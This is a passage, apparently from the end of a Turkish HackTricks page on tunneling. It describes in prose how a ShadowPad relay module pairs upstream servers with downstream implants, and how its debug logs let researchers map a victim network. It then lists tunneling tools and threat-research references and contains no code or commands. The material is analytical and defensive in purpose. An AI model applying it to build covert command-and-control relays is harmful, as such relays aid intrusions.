* **Relay orchestration** – modül iki liste tutar: “servers” (upstream düğümler) ve “clients” (downstream implant'lar). Yaklaşık 30 saniye içinde heartbeat gelmezse girdiler budanır. Her iki liste dolu olduğunda, ilk sağlıklı server ile ilk sağlıklı client eşleştirilir ve bir taraf kapanana kadar soketleri arasında baytlar geçirilir.  
* **Debug telemetry** – isteğe bağlı loglama her eşleştirme için source IP, destination IP ve iletilen toplam bayt miktarını kaydeder. Araştırmacılar bu izleri (breadcrumbs) kullanarak birden çok kurbana yayılan ShadowPad ağını yeniden inşa ettiler.

---

## Kontrol edilecek diğer araçlar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Referanslar

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
